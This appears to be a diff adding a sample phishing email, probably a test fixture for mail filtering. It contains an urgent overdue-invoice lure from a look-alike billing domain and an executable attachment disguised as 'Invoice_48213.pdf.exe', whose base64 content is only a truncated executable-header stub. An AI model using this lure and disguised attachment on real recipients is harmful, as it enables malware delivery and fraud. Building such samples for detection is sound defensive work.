@@ -1,0 +1,26 @@
+Return-Path: <billing@invoices-portal.example.org>
+Authentication-Results: mx.example.com; spf=softfail smtp.mailfrom=invoices-portal.example.org; dkim=pass; dmarc=none
+From: "Accounts Payable" <billing@invoices-portal.example.org>
+To: staff@example.com
+Subject: Final notice - overdue invoice #48213
+Date: Tue, 06 Oct 2026 11:40:02 -0400
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b2"
+
+--b2
+Content-Type: text/plain; charset="utf-8"
+
+Hello,
+
+This is a final notice for invoice #48213. Please review the attached invoice
+and arrange payment immediately to avoid service interruption.
+
+Accounts Payable
+
+--b2
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="Invoice_48213.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--b2--
